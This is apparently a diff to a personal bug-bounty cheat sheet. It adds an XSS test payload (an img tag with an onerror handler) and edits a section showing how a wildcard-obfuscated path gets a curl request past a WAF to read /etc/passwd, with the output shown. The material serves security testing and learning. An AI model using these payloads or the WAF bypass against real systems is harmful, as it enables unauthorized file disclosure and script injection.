@@ -2,6 +2,8 @@
 ># My personal CheatSheet
 <img alt="GIF" src="https://media1.giphy.com/media/Rm1p7xp3Odl2o/giphy.gif?raw=true" width="500" height="320" />
 
+`<img src=x onerror=alert('I hope you will find something helpful here :)')>`
+
 ### Contents:
   - [Categories](#contents)
       - [Bug Bounty 👨🏽‍💻](#bugbounty)
@@ -375,14 +377,13 @@ X-Forwarded-For: 127.0.0.1 -> 200
 ### Bypass LFI WAF
 
 If the WAF blocks you from reading /etc/passwd directly, you can use `?` to bypass it.
-#### `Example`
 ```bash
 curl http://vulnerable-web.io/read.php?filename=/etc/passwd -i
 HTTP/1.1 403 Forbidden
 [...]
 ```
 ```bash
-curl http://vulnerable-web.io/read.php?filename=/??c/?as?wd -I
+curl http://vulnerable-web.io/read.php?filename=/??c/?as?wd -i
 HTTP/1.1 200 OK
 [...]
 root:x:0:0:root:/root:/usr/bin/zsh
